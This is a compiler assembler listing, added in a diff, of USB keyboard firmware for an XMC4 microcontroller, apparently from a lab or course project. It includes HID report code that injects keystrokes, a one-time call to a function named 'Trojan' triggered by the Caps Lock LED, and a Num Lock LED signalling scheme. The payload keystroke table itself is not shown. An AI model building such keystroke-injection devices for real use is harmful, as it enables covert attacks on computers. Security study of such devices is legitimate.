+ 1385 00fe 484A     		ldr	r2, .L57+16
+ 1386 0100 12F81320 		ldrb	r2, [r2, r3, lsl #1]	@ zero_extendqisi2
+ 400:main.c        ****             
+ 1387              		.loc 2 400 27
+ 1388 0104 7B69     		ldr	r3, [r7, #20]
+ 1389 0106 9A70     		strb	r2, [r3, #2]
+ 402:main.c        ****                     //startTime = GetTick(); // Start timing when we are at the final report stage
+ 1390              		.loc 2 402 49
+ 1391 0108 424B     		ldr	r3, .L57+4
+ 1392 010a 1B68     		ldr	r3, [r3]
+ 1393 010c 444A     		ldr	r2, .L57+16
+ 1394 010e 12F81330 		ldrb	r3, [r2, r3, lsl #1]	@ zero_extendqisi2
+ 402:main.c        ****                     //startTime = GetTick(); // Start timing when we are at the final report stage
+ 1395              		.loc 2 402 20
+ 1396 0112 282B     		cmp	r3, #40
+ 1397 0114 08D1     		bne	.L46
+ 404:main.c        ****                     report -> Modifier = 0;
+ 1398              		.loc 2 404 37
+ 1399 0116 444B     		ldr	r3, .L57+24
+ 1400 0118 5B68     		ldr	r3, [r3, #4]
+ 1401 011a 1A46     		mov	r2, r3
+ 404:main.c        ****                     report -> Modifier = 0;
+ 1402              		.loc 2 404 31
+ 1403 011c 434B     		ldr	r3, .L57+28
+ 1404 011e 1A60     		str	r2, [r3]
+ 405:main.c        ****                 }else{
+ 1405              		.loc 2 405 40
+ 1406 0120 7B69     		ldr	r3, [r7, #20]
+ 1407 0122 0022     		movs	r2, #0
+ 1408 0124 1A70     		strb	r2, [r3]
+ 1409 0126 02E0     		b	.L47
+ 1410              	.L46:
+ 407:main.c        ****                 }
+ 1411              		.loc 2 407 38
+ 1412 0128 7B69     		ldr	r3, [r7, #20]
+ 1413 012a 0222     		movs	r2, #2
+ 1414 012c 1A70     		strb	r2, [r3]
+ 1415              	.L47:
+ 410:main.c        ****             }
+ 1416              		.loc 2 410 18
+ 1417 012e 3D4B     		ldr	r3, .L57+20
+ 1418 0130 0122     		movs	r2, #1
+ 1419 0132 1A70     		strb	r2, [r3]
+ 1420              		.loc 2 413 13
+ 1421 0134 64E0     		b	.L36
+ 1422              	.L37:
+ 414:main.c        **** 
+ 415:main.c        **** 
+ 416:main.c        ****         case 2: //AltGr
+ 417:main.c        ****             if(characterSent) {
+ 1423              		.loc 2 417 16
+ 1424 0136 3B4B     		ldr	r3, .L57+20
+ 1425 0138 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1426              		.loc 2 417 15
+ 1427 013a 002B     		cmp	r3, #0
+ 1428 013c 0ED0     		beq	.L48
+ 418:main.c        **** 			    report->Reserved = 0; 
+ 1429              		.loc 2 418 25
+ 1430 013e 7B69     		ldr	r3, [r7, #20]
+ 1431 0140 0022     		movs	r2, #0
+ 1432 0142 5A70     		strb	r2, [r3, #1]
+ 419:main.c        **** 			    report->KeyCode[0] = 0; 
+ 1433              		.loc 2 419 27
+ 1434 0144 7B69     		ldr	r3, [r7, #20]
+ 1435 0146 0022     		movs	r2, #0
+ 1436 0148 9A70     		strb	r2, [r3, #2]
+ 420:main.c        **** 			    characterSent = 0;
+ 1437              		.loc 2 420 22
+ 1438 014a 364B     		ldr	r3, .L57+20
+ 1439 014c 0022     		movs	r2, #0
+ 1440 014e 1A70     		strb	r2, [r3]
+ 421:main.c        **** 			    string_index++; 
+ 1441              		.loc 2 421 20
+ 1442 0150 304B     		ldr	r3, .L57+4
+ 1443 0152 1B68     		ldr	r3, [r3]
+ 1444 0154 0133     		adds	r3, r3, #1
+ 1445 0156 2F4A     		ldr	r2, .L57+4
+ 1446 0158 1360     		str	r3, [r2]
+ 422:main.c        ****             }else{
+ 423:main.c        **** 			    report->Reserved = 0; 
+ 424:main.c        **** 			    report->KeyCode[0] = string2sendLut[string_index].Key;
+ 425:main.c        ****             
+ 426:main.c        ****                 if (string2sendLut[string_index].Key == GERMAN_KEYBOARD_SC_ENTER) { 
+ 427:main.c        ****                     //startTime = GetTick(); // Start timing when we are at the final report stage
+ 428:main.c        ****                     startTime = DWT -> CYCCNT;
+ 429:main.c        ****                     report -> Modifier = 0;
+ 430:main.c        ****                 }else{
+ 431:main.c        ****                     report->Modifier = 0x40; 
+ 432:main.c        ****                 }
+ 433:main.c        **** 
+ 434:main.c        **** 			characterSent = 1;
+ 435:main.c        ****             }
+ 436:main.c        **** 
+ 437:main.c        ****             break;
+ 1447              		.loc 2 437 13
+ 1448 015a 51E0     		b	.L36
+ 1449              	.L48:
+ 423:main.c        **** 			    report->KeyCode[0] = string2sendLut[string_index].Key;
+ 1450              		.loc 2 423 25
+ 1451 015c 7B69     		ldr	r3, [r7, #20]
+ 1452 015e 0022     		movs	r2, #0
+ 1453 0160 5A70     		strb	r2, [r3, #1]
+ 424:main.c        ****             
+ 1454              		.loc 2 424 57
+ 1455 0162 2C4B     		ldr	r3, .L57+4
+ 1456 0164 1B68     		ldr	r3, [r3]
+ 1457 0166 2E4A     		ldr	r2, .L57+16
+ 1458 0168 12F81320 		ldrb	r2, [r2, r3, lsl #1]	@ zero_extendqisi2
+ 424:main.c        ****             
+ 1459              		.loc 2 424 27
+ 1460 016c 7B69     		ldr	r3, [r7, #20]
+ 1461 016e 9A70     		strb	r2, [r3, #2]
+ 426:main.c        ****                     //startTime = GetTick(); // Start timing when we are at the final report stage
+ 1462              		.loc 2 426 49
+ 1463 0170 284B     		ldr	r3, .L57+4
+ 1464 0172 1B68     		ldr	r3, [r3]
+ 1465 0174 2A4A     		ldr	r2, .L57+16
+ 1466 0176 12F81330 		ldrb	r3, [r2, r3, lsl #1]	@ zero_extendqisi2
+ 426:main.c        ****                     //startTime = GetTick(); // Start timing when we are at the final report stage
+ 1467              		.loc 2 426 20
+ 1468 017a 282B     		cmp	r3, #40
+ 1469 017c 08D1     		bne	.L50
+ 428:main.c        ****                     report -> Modifier = 0;
+ 1470              		.loc 2 428 37
+ 1471 017e 2A4B     		ldr	r3, .L57+24
+ 1472 0180 5B68     		ldr	r3, [r3, #4]
+ 1473 0182 1A46     		mov	r2, r3
+ 428:main.c        ****                     report -> Modifier = 0;
+ 1474              		.loc 2 428 31
+ 1475 0184 294B     		ldr	r3, .L57+28
+ 1476 0186 1A60     		str	r2, [r3]
+ 429:main.c        ****                 }else{
+ 1477              		.loc 2 429 40
+ 1478 0188 7B69     		ldr	r3, [r7, #20]
+ 1479 018a 0022     		movs	r2, #0
+ 1480 018c 1A70     		strb	r2, [r3]
+ 1481 018e 02E0     		b	.L51
+ 1482              	.L50:
+ 431:main.c        ****                 }
+ 1483              		.loc 2 431 38
+ 1484 0190 7B69     		ldr	r3, [r7, #20]
+ 1485 0192 4022     		movs	r2, #64
+ 1486 0194 1A70     		strb	r2, [r3]
+ 1487              	.L51:
+ 434:main.c        ****             }
+ 1488              		.loc 2 434 18
+ 1489 0196 234B     		ldr	r3, .L57+20
+ 1490 0198 0122     		movs	r2, #1
+ 1491 019a 1A70     		strb	r2, [r3]
+ 1492              		.loc 2 437 13
+ 1493 019c 30E0     		b	.L36
+ 1494              	.L38:
+ 438:main.c        ****         default:
+ 439:main.c        ****             if(characterSent) {
+ 1495              		.loc 2 439 16
+ 1496 019e 214B     		ldr	r3, .L57+20
+ 1497 01a0 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1498              		.loc 2 439 15
+ 1499 01a2 002B     		cmp	r3, #0
+ 1500 01a4 0ED0     		beq	.L52
+ 440:main.c        **** 			    report->Reserved = 0; 
+ 1501              		.loc 2 440 25
+ 1502 01a6 7B69     		ldr	r3, [r7, #20]
+ 1503 01a8 0022     		movs	r2, #0
+ 1504 01aa 5A70     		strb	r2, [r3, #1]
+ 441:main.c        **** 			    report->KeyCode[0] = 0; 
+ 1505              		.loc 2 441 27
+ 1506 01ac 7B69     		ldr	r3, [r7, #20]
+ 1507 01ae 0022     		movs	r2, #0
+ 1508 01b0 9A70     		strb	r2, [r3, #2]
+ 442:main.c        **** 			    characterSent = 0;
+ 1509              		.loc 2 442 22
+ 1510 01b2 1C4B     		ldr	r3, .L57+20
+ 1511 01b4 0022     		movs	r2, #0
+ 1512 01b6 1A70     		strb	r2, [r3]
+ 443:main.c        **** 			    string_index++; 
+ 1513              		.loc 2 443 20
+ 1514 01b8 164B     		ldr	r3, .L57+4
+ 1515 01ba 1B68     		ldr	r3, [r3]
+ 1516 01bc 0133     		adds	r3, r3, #1
+ 1517 01be 154A     		ldr	r2, .L57+4
+ 1518 01c0 1360     		str	r3, [r2]
+ 444:main.c        ****             }else {
+ 445:main.c        **** 			    report->Modifier = 0; 
+ 446:main.c        **** 			    report->Reserved = 0; 
+ 447:main.c        **** 			    report->KeyCode[0] = string2sendLut[string_index].Key;
+ 448:main.c        ****                 if (string2sendLut[string_index].Key == GERMAN_KEYBOARD_SC_ENTER) { 
+ 449:main.c        ****                     //startTime = GetTick(); // Start timing when we are at the final report stage
+ 450:main.c        ****                     startTime = DWT -> CYCCNT;
+ 451:main.c        ****                 }
+ 452:main.c        **** 			characterSent = 1;
+ 453:main.c        **** 		    }
+ 454:main.c        **** 		
+ 455:main.c        ****             break;
+ 1519              		.loc 2 455 13
+ 1520 01c2 1DE0     		b	.L36
+ 1521              	.L52:
+ 445:main.c        **** 			    report->Reserved = 0; 
+ 1522              		.loc 2 445 25
+ 1523 01c4 7B69     		ldr	r3, [r7, #20]
+ 1524 01c6 0022     		movs	r2, #0
+ 1525 01c8 1A70     		strb	r2, [r3]
+ 446:main.c        **** 			    report->KeyCode[0] = string2sendLut[string_index].Key;
+ 1526              		.loc 2 446 25
+ 1527 01ca 7B69     		ldr	r3, [r7, #20]
+ 1528 01cc 0022     		movs	r2, #0
+ 1529 01ce 5A70     		strb	r2, [r3, #1]
+ 447:main.c        ****                 if (string2sendLut[string_index].Key == GERMAN_KEYBOARD_SC_ENTER) { 
+ 1530              		.loc 2 447 57
+ 1531 01d0 104B     		ldr	r3, .L57+4
+ 1532 01d2 1B68     		ldr	r3, [r3]
+ 1533 01d4 124A     		ldr	r2, .L57+16
+ 1534 01d6 12F81320 		ldrb	r2, [r2, r3, lsl #1]	@ zero_extendqisi2
+ 447:main.c        ****                 if (string2sendLut[string_index].Key == GERMAN_KEYBOARD_SC_ENTER) { 
+ 1535              		.loc 2 447 27
+ 1536 01da 7B69     		ldr	r3, [r7, #20]
+ 1537 01dc 9A70     		strb	r2, [r3, #2]
+ 448:main.c        ****                     //startTime = GetTick(); // Start timing when we are at the final report stage
+ 1538              		.loc 2 448 49
+ 1539 01de 0D4B     		ldr	r3, .L57+4
+ 1540 01e0 1B68     		ldr	r3, [r3]
+ 1541 01e2 0F4A     		ldr	r2, .L57+16
+ 1542 01e4 12F81330 		ldrb	r3, [r2, r3, lsl #1]	@ zero_extendqisi2
+ 448:main.c        ****                     //startTime = GetTick(); // Start timing when we are at the final report stage
+ 1543              		.loc 2 448 20
+ 1544 01e8 282B     		cmp	r3, #40
+ 1545 01ea 04D1     		bne	.L54
+ 450:main.c        ****                 }
+ 1546              		.loc 2 450 37
+ 1547 01ec 0E4B     		ldr	r3, .L57+24
+ 1548 01ee 5B68     		ldr	r3, [r3, #4]
+ 1549 01f0 1A46     		mov	r2, r3
+ 450:main.c        ****                 }
+ 1550              		.loc 2 450 31
+ 1551 01f2 0E4B     		ldr	r3, .L57+28
+ 1552 01f4 1A60     		str	r2, [r3]
+ 1553              	.L54:
+ 452:main.c        **** 		    }
+ 1554              		.loc 2 452 18
+ 1555 01f6 0B4B     		ldr	r3, .L57+20
+ 1556 01f8 0122     		movs	r2, #1
+ 1557 01fa 1A70     		strb	r2, [r3]
+ 1558              		.loc 2 455 13
+ 1559 01fc 00E0     		b	.L36
+ 1560              	.L56:
+ 456:main.c        ****     }
+ 457:main.c        **** 	}
+ 1561              		.loc 2 457 2
+ 1562 01fe 00BF     		nop
+ 1563              	.L36:
+ 458:main.c        **** 	return true;
+ 1564              		.loc 2 458 9
+ 1565 0200 0123     		movs	r3, #1
+ 459:main.c        **** }
+ 1566              		.loc 2 459 1
+ 1567 0202 1846     		mov	r0, r3
+ 1568 0204 1C37     		adds	r7, r7, #28
+ 1569              	.LCFI41:
+ 1570              		.cfi_def_cfa_offset 4
+ 1571 0206 BD46     		mov	sp, r7
+ 1572              	.LCFI42:
+ 1573              		.cfi_def_cfa_register 13
+ 1574              		@ sp needed
+ 1575 0208 5DF8047B 		ldr	r7, [sp], #4
+ 1576              	.LCFI43:
+ 1577              		.cfi_restore 7
+ 1578              		.cfi_def_cfa_offset 0
+ 1579 020c 7047     		bx	lr
+ 1580              	.L58:
+ 1581 020e 00BF     		.align	2
+ 1582              	.L57:
+ 1583 0210 00000000 		.word	current_string_length
+ 1584 0214 00000000 		.word	string_index
+ 1585 0218 00000000 		.word	password_enable
+ 1586 021c 00000000 		.word	trojanLen
+ 1587 0220 00000000 		.word	string2sendLut
+ 1588 0224 20000000 		.word	characterSent
+ 1589 0228 001000E0 		.word	-536866816
+ 1590 022c 00000000 		.word	startTime
+ 1591              		.cfi_endproc
+ 1592              	.LFE209:
+ 1594              		.section	.text.CALLBACK_HID_Device_ProcessHIDReport,"ax",%progbits
+ 1595              		.align	1
+ 1596              		.global	CALLBACK_HID_Device_ProcessHIDReport
+ 1597              		.syntax unified
+ 1598              		.thumb
+ 1599              		.thumb_func
+ 1601              	CALLBACK_HID_Device_ProcessHIDReport:
+ 1602              	.LFB210:
+ 460:main.c        **** 
+ 461:main.c        **** 
+ 462:main.c        **** 
+ 463:main.c        **** 
+ 464:main.c        **** 
+ 465:main.c        **** // Called on report input. For keyboard HID devices, that's the state of the LEDs
+ 466:main.c        **** void CALLBACK_HID_Device_ProcessHIDReport(
+ 467:main.c        **** 						USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
+ 468:main.c        **** 						const uint8_t ReportID,
+ 469:main.c        **** 						const uint8_t ReportType,
+ 470:main.c        **** 						const void* ReportData,
+ 471:main.c        **** 						const uint16_t ReportSize ) {
+ 1603              		.loc 2 471 35
+ 1604              		.cfi_startproc
+ 1605              		@ args = 4, pretend = 0, frame = 24
+ 1606              		@ frame_needed = 1, uses_anonymous_args = 0
+ 1607 0000 80B5     		push	{r7, lr}
+ 1608              	.LCFI44:
+ 1609              		.cfi_def_cfa_offset 8
+ 1610              		.cfi_offset 7, -8
+ 1611              		.cfi_offset 14, -4
+ 1612 0002 86B0     		sub	sp, sp, #24
+ 1613              	.LCFI45:
+ 1614              		.cfi_def_cfa_offset 32
+ 1615 0004 00AF     		add	r7, sp, #0
+ 1616              	.LCFI46:
+ 1617              		.cfi_def_cfa_register 7
+ 1618 0006 F860     		str	r0, [r7, #12]
+ 1619 0008 7B60     		str	r3, [r7, #4]
+ 1620 000a 0B46     		mov	r3, r1
+ 1621 000c FB72     		strb	r3, [r7, #11]
+ 1622 000e 1346     		mov	r3, r2
+ 1623 0010 BB72     		strb	r3, [r7, #10]
+ 472:main.c        **** 	uint8_t *report = (uint8_t*)ReportData;
+ 1624              		.loc 2 472 11
+ 1625 0012 7B68     		ldr	r3, [r7, #4]
+ 1626 0014 7B61     		str	r3, [r7, #20]
+ 473:main.c        **** 
+ 474:main.c        **** 
+ 475:main.c        **** 	if(*report & HID_KEYBOARD_LED_NUMLOCK) {
+ 1627              		.loc 2 475 5
+ 1628 0016 7B69     		ldr	r3, [r7, #20]
+ 1629 0018 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1630              		.loc 2 475 13
+ 1631 001a 03F00103 		and	r3, r3, #1
+ 1632              		.loc 2 475 4
+ 1633 001e 002B     		cmp	r3, #0
+ 1634 0020 0CD0     		beq	.L60
+ 476:main.c        ****         if (password_enable == 1){
+ 1635              		.loc 2 476 29
+ 1636 0022 194B     		ldr	r3, .L66
+ 1637 0024 1B68     		ldr	r3, [r3]
+ 1638              		.loc 2 476 12
+ 1639 0026 012B     		cmp	r3, #1
+ 1640 0028 03D1     		bne	.L61
+ 477:main.c        ****             MeasureLedToggleDistance();
+ 1641              		.loc 2 477 13
+ 1642 002a FFF7FEFF 		bl	MeasureLedToggleDistance
+ 478:main.c        ****             bufferlogic();
+ 1643              		.loc 2 478 13
+ 1644 002e FFF7FEFF 		bl	bufferlogic
+ 1645              	.L61:
+ 479:main.c        ****         }
+ 480:main.c        **** 
+ 481:main.c        ****         XMC_GPIO_SetOutputHigh(LED1);
+ 1646              		.loc 2 481 9
+ 1647 0032 0121     		movs	r1, #1
+ 1648 0034 1548     		ldr	r0, .L66+4
+ 1649 0036 FFF7FEFF 		bl	XMC_GPIO_SetOutputHigh
+ 1650 003a 03E0     		b	.L62
+ 1651              	.L60:
+ 482:main.c        **** 
+ 483:main.c        ****     }
+ 484:main.c        **** 	else 
+ 485:main.c        **** 		XMC_GPIO_SetOutputLow(LED1);
+ 1652              		.loc 2 485 3
+ 1653 003c 0121     		movs	r1, #1
+ 1654 003e 1348     		ldr	r0, .L66+4
+ 1655 0040 FFF7FEFF 		bl	XMC_GPIO_SetOutputLow
+ 1656              	.L62:
+ 486:main.c        ****  
+ 487:main.c        **** 	
+ 488:main.c        **** 	
+ 489:main.c        **** 	if(*report & HID_KEYBOARD_LED_CAPSLOCK){
+ 1657              		.loc 2 489 5
+ 1658 0044 7B69     		ldr	r3, [r7, #20]
+ 1659 0046 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1660              		.loc 2 489 13
+ 1661 0048 03F00203 		and	r3, r3, #2
+ 1662              		.loc 2 489 4
+ 1663 004c 002B     		cmp	r3, #0
+ 1664 004e 13D0     		beq	.L63
+ 1665              	.LBB7:
+ 490:main.c        ****         password_enable = 0; // Disable password mode
+ 1666              		.loc 2 490 25
+ 1667 0050 0D4B     		ldr	r3, .L66
+ 1668 0052 0022     		movs	r2, #0
+ 1669 0054 1A60     		str	r2, [r3]
+ 491:main.c        **** 		XMC_GPIO_SetOutputHigh(LED2);
+ 1670              		.loc 2 491 3
+ 1671 0056 0021     		movs	r1, #0
+ 1672 0058 0C48     		ldr	r0, .L66+4
+ 1673 005a FFF7FEFF 		bl	XMC_GPIO_SetOutputHigh
+ 492:main.c        ****         static bool hasRunTrojan = false;
+ 493:main.c        ****         if (!hasRunTrojan) {
+ 1674              		.loc 2 493 13
+ 1675 005e 0C4B     		ldr	r3, .L66+8
+ 1676 0060 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1677 0062 83F00103 		eor	r3, r3, #1
+ 1678 0066 DBB2     		uxtb	r3, r3
+ 1679              		.loc 2 493 12
+ 1680 0068 002B     		cmp	r3, #0
+ 1681 006a 09D0     		beq	.L65
+ 494:main.c        ****             
+ 495:main.c        ****             Trojan();
+ 1682              		.loc 2 495 13
+ 1683 006c FFF7FEFF 		bl	Trojan
+ 496:main.c        ****             hasRunTrojan = true;
+ 1684              		.loc 2 496 26
+ 1685 0070 074B     		ldr	r3, .L66+8
+ 1686 0072 0122     		movs	r2, #1
+ 1687 0074 1A70     		strb	r2, [r3]
+ 1688              	.LBE7:
+ 497:main.c        ****         }
+ 498:main.c        **** 
+ 499:main.c        ****     }else 
+ 500:main.c        **** 		XMC_GPIO_SetOutputLow(LED2);
+ 501:main.c        **** }
+ 1689              		.loc 2 501 1
+ 1690 0076 03E0     		b	.L65
+ 1691              	.L63:
+ 500:main.c        **** }
+ 1692              		.loc 2 500 3
+ 1693 0078 0021     		movs	r1, #0
+ 1694 007a 0448     		ldr	r0, .L66+4
+ 1695 007c FFF7FEFF 		bl	XMC_GPIO_SetOutputLow
+ 1696              	.L65:
+ 1697              		.loc 2 501 1
+ 1698 0080 00BF     		nop
+ 1699 0082 1837     		adds	r7, r7, #24
+ 1700              	.LCFI47:
+ 1701              		.cfi_def_cfa_offset 8
+ 1702 0084 BD46     		mov	sp, r7
+ 1703              	.LCFI48:
+ 1704              		.cfi_def_cfa_register 13
+ 1705              		@ sp needed
+ 1706 0086 80BD     		pop	{r7, pc}
+ 1707              	.L67:
+ 1708              		.align	2
+ 1709              	.L66:
+ 1710 0088 00000000 		.word	password_enable
+ 1711 008c 00810248 		.word	1208123648
+ 1712 0090 34000000 		.word	hasRunTrojan.0
+ 1713              		.cfi_endproc
+ 1714              	.LFE210:
+ 1716              		.section	.text.SystemCoreClockSetup,"ax",%progbits
+ 1717              		.align	1
+ 1718              		.global	SystemCoreClockSetup
+ 1719              		.syntax unified
+ 1720              		.thumb
+ 1721              		.thumb_func
+ 1723              	SystemCoreClockSetup:
+ 1724              	.LFB211:
+ 502:main.c        **** 
+ 503:main.c        **** void SystemCoreClockSetup(void) {
+ 1725              		.loc 2 503 33
+ 1726              		.cfi_startproc
+ 1727              		@ args = 0, pretend = 0, frame = 0
+ 1728              		@ frame_needed = 1, uses_anonymous_args = 0
+ 1729 0000 80B5     		push	{r7, lr}
+ 1730              	.LCFI49:
+ 1731              		.cfi_def_cfa_offset 8
+ 1732              		.cfi_offset 7, -8
+ 1733              		.cfi_offset 14, -4
+ 1734 0002 00AF     		add	r7, sp, #0
+ 1735              	.LCFI50:
+ 1736              		.cfi_def_cfa_register 7
+ 504:main.c        **** 	/* Setup settings for USB clock */
+ 505:main.c        **** 	XMC_SCU_CLOCK_Init(&clock_config);
+ 1737              		.loc 2 505 2
+ 1738 0004 0A48     		ldr	r0, .L69
+ 1739 0006 FFF7FEFF 		bl	XMC_SCU_CLOCK_Init
+ 506:main.c        **** 
+ 507:main.c        **** 	XMC_SCU_CLOCK_EnableUsbPll();
+ 1740              		.loc 2 507 2
+ 1741 000a FFF7FEFF 		bl	XMC_SCU_CLOCK_EnableUsbPll
+ 508:main.c        **** 	XMC_SCU_CLOCK_StartUsbPll(2, 64);
+ 1742              		.loc 2 508 2
+ 1743 000e 4021     		movs	r1, #64
+ 1744 0010 0220     		movs	r0, #2
+ 1745 0012 FFF7FEFF 		bl	XMC_SCU_CLOCK_StartUsbPll
+ 509:main.c        **** 	XMC_SCU_CLOCK_SetUsbClockDivider(4);
+ 1746              		.loc 2 509 2
+ 1747 0016 0420     		movs	r0, #4
+ 1748 0018 FFF7FEFF 		bl	XMC_SCU_CLOCK_SetUsbClockDivider
+ 510:main.c        **** 	XMC_SCU_CLOCK_SetUsbClockSource(XMC_SCU_CLOCK_USBCLKSRC_USBPLL);
+ 1749              		.loc 2 510 2
+ 1750 001c 0020     		movs	r0, #0
+ 1751 001e FFF7FEFF 		bl	XMC_SCU_CLOCK_SetUsbClockSource
+ 511:main.c        **** 	XMC_SCU_CLOCK_EnableClock(XMC_SCU_CLOCK_USB);
+ 1752              		.loc 2 511 2
+ 1753 0022 0120     		movs	r0, #1
+ 1754 0024 FFF7FEFF 		bl	XMC_SCU_CLOCK_EnableClock
+ 512:main.c        **** 
+ 513:main.c        **** 	SystemCoreClockUpdate();
+ 1755              		.loc 2 513 2
+ 1756 0028 FFF7FEFF 		bl	SystemCoreClockUpdate
+ 514:main.c        **** }
+ 1757              		.loc 2 514 1
+ 1758 002c 00BF     		nop
+ 1759 002e 80BD     		pop	{r7, pc}
+ 1760              	.L70:
+ 1761              		.align	2
+ 1762              	.L69:
+ 1763 0030 00000000 		.word	clock_config
+ 1764              		.cfi_endproc
+ 1765              	.LFE211:
+ 1767              		.bss
+ 1768              	hasRunTrojan.0:
+ 1769 0034 00       		.space	1
+ 1771              		.text
+ 1772              	.Letext0:
+ 1773              		.file 3 "/nas/ei/share/tools/gcc/gcc-arm/gcc-arm-none-eabi-10.3-2021.10/arm-none-eabi/include/mach
+ 1774              		.file 4 "/nas/ei/share/tools/gcc/gcc-arm/gcc-arm-none-eabi-10.3-2021.10/arm-none-eabi/include/sys/
+ 1775              		.file 5 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/CMSIS/Include/core_cm4.h"
+ 1776              		.file 6 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc4_gpio.h"
+ 1777              		.file 7 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc4_scu.h"
+ 1778              		.file 8 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/ThirdPartyLibraries/USBlib/USB/Core/XMC4000/..
+ 1779              		.file 9 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/ThirdPartyLibraries/USBlib/USB/Class/Device/..
+ 1780              		.file 10 "/opt/XMClib/XMC_Peripheral_Library_v2.1.16/ThirdPartyLibraries/USBlib/USB/Class/Device/H
+ 1781              		.file 11 "KeyboardHID.h"
+DEFINED SYMBOLS
+                            *ABS*:0000000000000000 main.c
+     /tmp/cc74d4Ab.s:19     .text.XMC_GPIO_SetOutputHigh:0000000000000000 $t
+     /tmp/cc74d4Ab.s:24     .text.XMC_GPIO_SetOutputHigh:0000000000000000 XMC_GPIO_SetOutputHigh
+     /tmp/cc74d4Ab.s:70     .text.XMC_GPIO_SetOutputLow:0000000000000000 $t
+     /tmp/cc74d4Ab.s:75     .text.XMC_GPIO_SetOutputLow:0000000000000000 XMC_GPIO_SetOutputLow
+     /tmp/cc74d4Ab.s:124    .bss:0000000000000000 i
+     /tmp/cc74d4Ab.s:121    .bss:0000000000000000 $d
+     /tmp/cc74d4Ab.s:130    .bss:0000000000000004 maxtime
+     /tmp/cc74d4Ab.s:136    .bss:0000000000000008 solutionlen
+     /tmp/cc74d4Ab.s:143    .data:0000000000000000 password_enable
+     /tmp/cc74d4Ab.s:140    .data:0000000000000000 $d
+     /tmp/cc74d4Ab.s:150    .bss:000000000000000c string_index
+     /tmp/cc74d4Ab.s:157    .data:0000000000000004 stringlenght
+     /tmp/cc74d4Ab.s:162    .data:0000000000000008 global_string_len
+     /tmp/cc74d4Ab.s:168    .bss:0000000000000010 global_index
+     /tmp/cc74d4Ab.s:174    .bss:0000000000000014 led_toggle_distance
+     /tmp/cc74d4Ab.s:177    .bss:0000000000000018 last_led_tick
+     /tmp/cc74d4Ab.s:184    .bss:000000000000001c public_distance
+     /tmp/cc74d4Ab.s:186    .bss:0000000000000020 characterSent
+     /tmp/cc74d4Ab.s:189    .bss:0000000000000021 indexToSend
+     /tmp/cc74d4Ab.s:196    .bss:0000000000000024 msgiterator
+     /tmp/cc74d4Ab.s:202    .bss:0000000000000028 solution_paste_index
+     /tmp/cc74d4Ab.s:208    .bss:000000000000002c msTicks
+     /tmp/cc74d4Ab.s:215    .data:000000000000000c current_str_lenght
+     /tmp/cc74d4Ab.s:221    .data:0000000000000010 string2sendlen
+     /tmp/cc74d4Ab.s:227    .data:0000000000000014 current_string_length
+     /tmp/cc74d4Ab.s:234    .bss:0000000000000030 startTime
+     /tmp/cc74d4Ab.s:241    .data:0000000000000018 trojanLen
+     /tmp/cc74d4Ab.s:247    .data:000000000000001c keyLut
+     /tmp/cc74d4Ab.s:435    .data:00000000000000dc solutionLut
+     /tmp/cc74d4Ab.s:447    .data:0000000000000140 string2sendLut
+     /tmp/cc74d4Ab.s:457    .data:00000000000001a4 trojanInstuctionsLut
+     /tmp/cc74d4Ab.s:531    .text.insertKeydata:0000000000000000 $t
+     /tmp/cc74d4Ab.s:537    .text.insertKeydata:0000000000000000 insertKeydata
+     /tmp/cc74d4Ab.s:630    .text.MeasureLedToggleDistance:0000000000000000 $t
+     /tmp/cc74d4Ab.s:636    .text.MeasureLedToggleDistance:0000000000000000 MeasureLedToggleDistance
+     /tmp/cc74d4Ab.s:726    .text.MeasureLedToggleDistance:000000000000006c $d
+     /tmp/cc74d4Ab.s:738    .text.bufferlogic:0000000000000000 $t
+     /tmp/cc74d4Ab.s:744    .text.bufferlogic:0000000000000000 bufferlogic
+     /tmp/cc74d4Ab.s:866    .text.bufferlogic:00000000000000ac $d
+     /tmp/cc74d4Ab.s:879    .text.ResetBufferLogic:0000000000000000 $t
+     /tmp/cc74d4Ab.s:885    .text.ResetBufferLogic:0000000000000000 ResetBufferLogic
+     /tmp/cc74d4Ab.s:1005   .text.ResetBufferLogic:000000000000008c $d
+     /tmp/cc74d4Ab.s:1018   .text.Trojan:0000000000000000 $t
+     /tmp/cc74d4Ab.s:1024   .text.Trojan:0000000000000000 Trojan
+     /tmp/cc74d4Ab.s:1077   .text.Trojan:000000000000003c $d
+     /tmp/cc74d4Ab.s:1091   .rodata:0000000000000000 clock_config
+     /tmp/cc74d4Ab.s:1088   .rodata:0000000000000000 $d
+     /tmp/cc74d4Ab.s:1107   .text.main:0000000000000000 $t
+     /tmp/cc74d4Ab.s:1113   .text.main:0000000000000000 main
+     /tmp/cc74d4Ab.s:1723   .text.SystemCoreClockSetup:0000000000000000 SystemCoreClockSetup
+     /tmp/cc74d4Ab.s:1187   .text.main:000000000000005c $d
+     /tmp/cc74d4Ab.s:1196   .text.CALLBACK_HID_Device_CreateHIDReport:0000000000000000 $t
+     /tmp/cc74d4Ab.s:1202   .text.CALLBACK_HID_Device_CreateHIDReport:0000000000000000 CALLBACK_HID_Device_CreateHIDReport
+     /tmp/cc74d4Ab.s:1583   .text.CALLBACK_HID_Device_CreateHIDReport:0000000000000210 $d
+     /tmp/cc74d4Ab.s:1595   .text.CALLBACK_HID_Device_ProcessHIDReport:0000000000000000 $t
+     /tmp/cc74d4Ab.s:1601   .text.CALLBACK_HID_Device_ProcessHIDReport:0000000000000000 CALLBACK_HID_Device_ProcessHIDReport
+     /tmp/cc74d4Ab.s:1710   .text.CALLBACK_HID_Device_ProcessHIDReport:0000000000000088 $d
+     /tmp/cc74d4Ab.s:1768   .bss:0000000000000034 hasRunTrojan.0
+     /tmp/cc74d4Ab.s:1717   .text.SystemCoreClockSetup:0000000000000000 $t
+     /tmp/cc74d4Ab.s:1763   .text.SystemCoreClockSetup:0000000000000030 $d
+                           .group:0000000000000000 wm4.0.467689a90594456bf46c01d2d8793c7f
+                           .group:0000000000000000 wm4._newlib_version.h.4.bfdf54b0af045d4a71376ae00f63a22c
